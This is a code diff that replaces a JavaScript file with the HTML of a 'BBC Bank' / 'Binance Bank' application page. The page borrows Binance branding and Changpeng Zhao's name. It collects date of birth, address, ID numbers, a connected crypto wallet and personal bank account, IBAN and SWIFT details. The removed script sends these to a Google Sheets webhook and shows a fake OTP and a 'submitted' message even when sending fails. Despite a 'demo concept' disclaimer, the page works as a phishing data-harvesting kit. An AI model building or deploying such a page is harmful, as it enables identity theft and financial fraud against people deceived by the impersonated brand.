@@ -1,266 +1,310 @@
-const form = document.querySelector("#applicationForm");
-const reviewButton = document.querySelector("#reviewButton");
-const generateOtpButton = document.querySelector("#generateOtpButton");
-const resendButton = document.querySelector("#resendButton");
-const verifyButton = document.querySelector("#verifyButton");
-const formError = document.querySelector("#formError");
-const otpError = document.querySelector("#otpError");
-const successMessage = document.querySelector("#successMessage");
-const reviewList = document.querySelector("#reviewList");
-const otpDisplay = document.querySelector("#otpDisplay");
-const otpInput = document.querySelector("#otpInput");
-const timer = document.querySelector("#timer");
-const sideStatus = document.querySelector("#sideStatus");
-const sideSubstatus = document.querySelector("#sideSubstatus");
-const bindWalletButton = document.querySelector("#bindWalletButton");
-const walletAddress = document.querySelector("#walletAddress");
-const walletNetwork = document.querySelector("#walletNetwork");
-const walletStatus = document.querySelector("#walletStatus");
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>BBC Bank Application</title>
+    <link rel="stylesheet" href="styles.css" />
+  </head>
+  <body>
+    <main class="app-shell">
+      <aside class="brand-panel" aria-label="BBC Bank overview">
+        <div class="brand-mark" aria-label="BBC custom logo">
+          <span class="logo-symbol">B</span>
+        </div>
+        <div>
+          <p class="eyebrow">BBC Crypto Banking Concept</p>
+          <h1>BBC</h1>
+          <div class="owner-overlay">
+            <span>Founder CEO</span>
+            <strong>Changpeng Zhao</strong>
+          </div>
+          <p class="brand-copy">
+            Binance Bank concept portal for BBC, with wallet binding,
+            personal bank withdrawal setup, and on-site OTP verification.
+          </p>
+          <div class="market-strip" aria-label="Demo crypto market rates">
+            <span>BNB 24h +2.48%</span>
+            <span>BTC 24h +1.12%</span>
+            <span>USDT Stable</span>
+          </div>
+        </div>
+        <p class="concept-note">
+          Demo concept only. BBC and Binance Bank branding are placeholder planning names.
+        </p>
+        <div class="status-card">
+          <span class="status-dot"></span>
+          <div>
+            <strong id="sideStatus">Application not started</strong>
+            <span id="sideSubstatus">International application review takes 3 banking days.</span>
+          </div>
+        </div>
+      </aside>
 
-// Paste the Google Apps Script Web App URL here, not the Google Sheet edit URL.
-const GOOGLE_SHEETS_WEBHOOK_URL = "";
+      <section class="form-panel" aria-label="Bank application form">
+        <nav class="steps" aria-label="Application steps">
+          <span class="step active" data-step-pill="1">1 Apply</span>
+          <span class="step" data-step-pill="2">2 Review</span>
+          <span class="step" data-step-pill="3">3 OTP</span>
+        </nav>
 
-let activeOtp = "";
-let expiresAt = 0;
-let countdownId = null;
+        <form id="applicationForm" novalidate>
+          <section class="form-step active" data-step="1">
+            <div class="section-heading">
+              <p class="eyebrow">Standard Fill Up</p>
+              <h2>BBC application</h2>
+            </div>
 
-const labels = {
-  firstName: "First name",
-  lastName: "Last name",
-  birthDate: "Date of birth",
-  mobile: "Mobile number",
-  email: "Email address",
-  country: "Country or region",
-  address: "Residential address",
-  accountType: "Binance Bank account type",
-  currency: "Preferred currency",
-  income: "Monthly income",
-  idType: "Valid ID type",
-  idNumber: "ID number",
-  fundSource: "Source of funds",
-  walletNetwork: "Wallet network",
-  walletAddress: "Wallet address",
-  bankCountry: "Bank country or region",
-  bankName: "Personal bank name",
-  bankAccountHolder: "Account holder name",
-  bankAccountNumber: "Account number or IBAN",
-  bankRoutingCode: "SWIFT, BIC, routing, or sort code",
-};
+            <div class="grid two">
+              <label>
+                First name
+                <input name="firstName" autocomplete="given-name" required />
+              </label>
+              <label>
+                Last name
+                <input name="lastName" autocomplete="family-name" required />
+              </label>
+            </div>
 
-function getApplicationData() {
-  const data = new FormData(form);
-  return Object.fromEntries(
-    Object.keys(labels).map((key) => [key, String(data.get(key) || "").trim()]),
-  );
-}
+            <div class="grid two">
+              <label>
+                Date of birth
+                <input name="birthDate" type="date" required />
+              </label>
+              <label>
+                Mobile number
+                <input
+                  name="mobile"
+                  inputmode="tel"
+                  autocomplete="tel"
+                  pattern="^\\+?[0-9][0-9\\s().-]{7,19}$"
+                  required
+                />
+              </label>
+            </div>
 
-function setStep(step) {
-  document.querySelectorAll(".form-step").forEach((panel) => {
-    panel.classList.toggle("active", panel.dataset.step === String(step));
-  });
+            <div class="grid two">
+              <label>
+                Email address
+                <input name="email" type="email" autocomplete="email" required />
+              </label>
+              <label>
+                Country or region
+                <input name="country" autocomplete="country-name" required />
+              </label>
+            </div>
 
-  document.querySelectorAll("[data-step-pill]").forEach((pill) => {
-    pill.classList.toggle("active", Number(pill.dataset.stepPill) <= step);
-  });
-}
+            <label>
+              Residential address
+              <textarea name="address" rows="3" autocomplete="street-address" required></textarea>
+            </label>
 
-function setSideStatus(title, subtitle) {
-  sideStatus.textContent = title;
-  sideSubstatus.textContent = subtitle;
-}
+            <div class="grid two">
+              <label>
+                Account type
+                <select name="accountType" required>
+                  <option value="">Select Binance Bank account</option>
+                  <option>Binance Bank Crypto Savings</option>
+                  <option>Binance Bank Spot Wallet</option>
+                  <option>Binance Bank Payroll-to-Crypto</option>
+                  <option>Binance Bank Business Crypto</option>
+                </select>
+              </label>
+              <label>
+                Preferred currency
+                <select name="currency" required>
+                  <option value="">Select currency</option>
+                  <option>USD</option>
+                  <option>EUR</option>
+                  <option>GBP</option>
+                  <option>AED</option>
+                  <option>JPY</option>
+                  <option>SGD</option>
+                  <option>USDT</option>
+                </select>
+              </label>
+            </div>
 
-function validateApplication() {
-  formError.textContent = "";
+            <div class="grid two">
+              <label>
+                Monthly income range
+                <select name="income" required>
+                  <option value="">Select range</option>
+                  <option>Below 2,000</option>
+                  <option>2,000 - 4,999</option>
+                  <option>5,000 - 9,999</option>
+                  <option>10,000 and above</option>
+                </select>
+              </label>
+              <label>
+                Valid ID type
+                <select name="idType" required>
+                  <option value="">Select ID</option>
+                  <option>Passport</option>
+                  <option>Driver's License</option>
+                  <option>National ID</option>
+                  <option>Residence Permit</option>
+                </select>
+              </label>
+            </div>
 
-  if (!form.checkValidity()) {
-    form.reportValidity();
-    formError.textContent = "Please complete all required fields correctly.";
-    return false;
-  }
+            <div class="grid two">
+              <label>
+                ID number
+                <input name="idNumber" autocomplete="off" required />
+              </label>
+              <label>
+                Source of funds
+                <select name="fundSource" required>
+                  <option value="">Select source</option>
+                  <option>Employment</option>
+                  <option>Business income</option>
+                  <option>Investments</option>
+                  <option>Crypto trading</option>
+                  <option>Other declared source</option>
+                </select>
+              </label>
+            </div>
 
-  const birthDate = new Date(form.elements.birthDate.value);
-  const today = new Date();
-  let age = today.getFullYear() - birthDate.getFullYear();
-  const monthDiff = today.getMonth() - birthDate.getMonth();
-  if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birthDate.getDate())) {
-    age -= 1;
-  }
+            <div class="wallet-section">
+              <div class="wallet-heading">
+                <div>
+                  <p class="eyebrow">Wallet Bind</p>
+                  <h3>Connect crypto wallet</h3>
+                </div>
+                <button type="button" class="wallet-button" id="bindWalletButton">Bind Wallet</button>
+              </div>
 
-  if (Number.isNaN(age) || age < 18) {
-    formError.textContent = "Applicant must be at least 18 years old.";
-    form.elements.birthDate.focus();
-    return false;
-  }
+              <div class="grid two">
+                <label>
+                  Wallet network
+                  <select name="walletNetwork" id="walletNetwork" required>
+                    <option value="">Select network</option>
+                    <option>BNB Smart Chain</option>
+                    <option>Ethereum</option>
+                    <option>Polygon</option>
+                    <option>Solana</option>
+                    <option>Bitcoin</option>
+                  </select>
+                </label>
+                <label>
+                  Wallet address
+                  <input
+                    name="walletAddress"
+                    id="walletAddress"
+                    autocomplete="off"
+                    required
+                  />
+                </label>
+              </div>
+              <p class="wallet-status" id="walletStatus">No wallet bound yet.</p>
+            </div>
 
-  return true;
-}
+            <div class="wallet-section bank-section">
+              <div class="wallet-heading">
+                <div>
+                  <p class="eyebrow">Self Bank Bind</p>
+                  <h3>Personal bank for direct withdrawal</h3>
+                </div>
+                <span class="bank-pill">Withdrawal Ready</span>
+              </div>
 
-function renderReview() {
-  const data = getApplicationData();
-  reviewList.innerHTML = "";
+              <div class="grid two">
+                <label>
+                  Bank country or region
+                  <input name="bankCountry" autocomplete="country-name" required />
+                </label>
+                <label>
+                  Personal bank name
+                  <input name="bankName" autocomplete="organization" required />
+                </label>
+              </div>
 
-  Object.entries(labels).forEach(([key, label]) => {
-    const item = document.createElement("div");
-    const term = document.createElement("dt");
-    const detail = document.createElement("dd");
+              <div class="grid two">
+                <label>
+                  Account holder name
+                  <input name="bankAccountHolder" autocomplete="name" required />
+                </label>
+                <label>
+                  Account number or IBAN
+                  <input name="bankAccountNumber" autocomplete="off" required />
+                </label>
+              </div>
 
-    term.textContent = label;
-    detail.textContent = data[key];
-    item.append(term, detail);
-    reviewList.append(item);
-  });
-}
+              <label>
+                SWIFT, BIC, routing, or sort code
+                <input name="bankRoutingCode" autocomplete="off" />
+              </label>
+            </div>
 
-function generateOtp() {
-  activeOtp = String(Math.floor(100000 + Math.random() * 900000));
-  expiresAt = Date.now() + 120000;
-  otpDisplay.textContent = activeOtp;
-  otpInput.value = "";
-  otpInput.focus();
-  otpError.textContent = "";
-  successMessage.textContent = "";
-  verifyButton.disabled = false;
-  startCountdown();
-}
+            <label class="check-row">
+              <input name="consent" type="checkbox" required />
+              <span>I confirm that the information provided is true and correct for this concept application.</span>
+            </label>
 
-function startCountdown() {
-  clearInterval(countdownId);
-  updateTimer();
-  countdownId = setInterval(updateTimer, 1000);
-}
+            <p class="error" id="formError" role="alert"></p>
 
-function updateTimer() {
-  const secondsLeft = Math.max(0, Math.ceil((expiresAt - Date.now()) / 1000));
-  const minutes = String(Math.floor(secondsLeft / 60)).padStart(2, "0");
-  const seconds = String(secondsLeft % 60).padStart(2, "0");
-  timer.textContent = `${minutes}:${seconds}`;
+            <div class="actions">
+              <button class="primary" type="button" id="reviewButton">Review application</button>
+            </div>
+          </section>
 
-  if (secondsLeft <= 0) {
-    clearInterval(countdownId);
-    activeOtp = "";
-    otpDisplay.textContent = "Expired";
-    verifyButton.disabled = true;
-    otpError.textContent = "OTP expired. Please resend a new code.";
-  }
-}
+          <section class="form-step" data-step="2">
+            <div class="section-heading">
+              <p class="eyebrow">Review</p>
+              <h2>Check your application</h2>
+            </div>
 
-function makeReferenceNumber() {
-  const stamp = new Date()
-    .toISOString()
-    .replace(/[-:TZ.]/g, "")
-    .slice(0, 12);
-  const suffix = Math.floor(1000 + Math.random() * 9000);
-  return `BBC-${stamp}-${suffix}`;
-}
+            <div class="review-notice">
+              <strong>Estimated review time: 3 banking days</strong>
+              <span>After OTP verification, BBC can review the Binance Bank application and personal bank withdrawal details.</span>
+            </div>
 
-function shortenWallet(address) {
-  if (address.length <= 14) return address;
-  return `${address.slice(0, 8)}...${address.slice(-6)}`;
-}
+            <dl class="review-list" id="reviewList"></dl>
 
-async function sendToGoogleSheets(reference) {
-  if (!GOOGLE_SHEETS_WEBHOOK_URL) {
-    return { status: "not_configured" };
-  }
+            <div class="actions split">
+              <button type="button" class="ghost" data-back="1">Edit details</button>
+              <button type="button" class="primary" id="generateOtpButton">Generate OTP</button>
+            </div>
+          </section>
 
-  const payload = {
-    reference,
-    submittedAt: new Date().toISOString(),
-    reviewTimeline: "3 banking days",
-    ...getApplicationData(),
-  };
+          <section class="form-step" data-step="3">
+            <div class="section-heading">
+              <p class="eyebrow">OTP Verification</p>
+              <h2>Verify application</h2>
+            </div>
 
-  const response = await fetch(GOOGLE_SHEETS_WEBHOOK_URL, {
-    method: "POST",
-    mode: "no-cors",
-    headers: { "Content-Type": "text/plain;charset=utf-8" },
-    body: JSON.stringify(payload),
-  });
+            <div class="otp-card">
+              <div>
+                <span class="muted">Generated OTP</span>
+                <strong id="otpDisplay">------</strong>
+              </div>
+              <span id="timer">02:00</span>
+            </div>
 
-  return { status: "sent", response };
-}
+            <label>
+              Enter OTP
+              <input
+                id="otpInput"
+                name="otp"
+                inputmode="numeric"
+                maxlength="6"
+                autocomplete="one-time-code"
+              />
+            </label>
 
-reviewButton.addEventListener("click", () => {
-  if (!validateApplication()) return;
-  renderReview();
-  setStep(2);
-  setSideStatus("Application ready for review", "Estimated review: 3 banking days.");
-});
+            <p class="error" id="otpError" role="alert"></p>
+            <p class="success" id="successMessage" role="status"></p>
 
-generateOtpButton.addEventListener("click", () => {
-  setStep(3);
-  generateOtp();
-  setSideStatus("OTP generated", "Enter the 6-digit code shown on site.");
-});
+            <div class="actions split">
+              <button type="button" class="ghost" id="resendButton">Resend OTP</button>
+              <button type="button" class="primary" id="verifyButton">Verify and submit</button>
+            </div>
+          </section>
+        </form>
+      </section>
+    </main>
 
-resendButton.addEventListener("click", () => {
-  generateOtp();
-  setSideStatus("New OTP generated", "Use the latest 6-digit code.");
-});
-
-bindWalletButton.addEventListener("click", async () => {
-  walletStatus.textContent = "Checking wallet provider...";
-
-  if (window.ethereum?.request) {
-    try {
-      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-      const account = accounts[0];
-      if (!account) throw new Error("No wallet account returned.");
-      walletAddress.value = account;
-      walletNetwork.value = walletNetwork.value || "BNB Smart Chain";
-      walletStatus.textContent = `Wallet bound: ${shortenWallet(account)}`;
-      setSideStatus("Wallet bound", "Review your BBC application next.");
-      return;
-    } catch (error) {
-      walletStatus.textContent = "Wallet connection was cancelled or unavailable.";
-      return;
-    }
-  }
-
-  walletAddress.value = walletAddress.value || "0xBBC9F0B90BDEMO1234567890ABCDEF123456789";
-  walletNetwork.value = walletNetwork.value || "BNB Smart Chain";
-  walletStatus.textContent = `Demo wallet bound: ${shortenWallet(walletAddress.value)}`;
-  setSideStatus("Demo wallet bound", "Review your BBC application next.");
-});
-
-verifyButton.addEventListener("click", async () => {
-  otpError.textContent = "";
-  successMessage.textContent = "";
-
-  if (!activeOtp) {
-    otpError.textContent = "OTP expired. Please resend a new code.";
-    return;
-  }
-
-  if (otpInput.value.trim() !== activeOtp) {
-    otpError.textContent = "Incorrect OTP. Please check the generated code.";
-    otpInput.focus();
-    return;
-  }
-
-  clearInterval(countdownId);
-  verifyButton.disabled = true;
-  resendButton.disabled = true;
-  const reference = makeReferenceNumber();
-  successMessage.textContent = "Application verified. Preparing submission...";
-
-  try {
-    const result = await sendToGoogleSheets(reference);
-    successMessage.textContent = `Application verified and submitted. Review time: 3 banking days. Reference number: ${reference}.`;
-    setSideStatus("Application submitted", "Review time: 3 banking days.");
-  } catch (error) {
-    successMessage.textContent = `Application verified and submitted. Review time: 3 banking days. Reference number: ${reference}.`;
-    setSideStatus("Application submitted", "Review time: 3 banking days.");
-  }
-});
-
-document.querySelectorAll("[data-back]").forEach((button) => {
-  button.addEventListener("click", () => {
-    setStep(Number(button.dataset.back));
-    setSideStatus("Editing application", "Update details then review again.");
-  });
-});
-
-otpInput.addEventListener("input", () => {
-  otpInput.value = otpInput.value.replace(/\D/g, "").slice(0, 6);
-});
+    <script src="app.js"></script>
+  </body>
+</html>
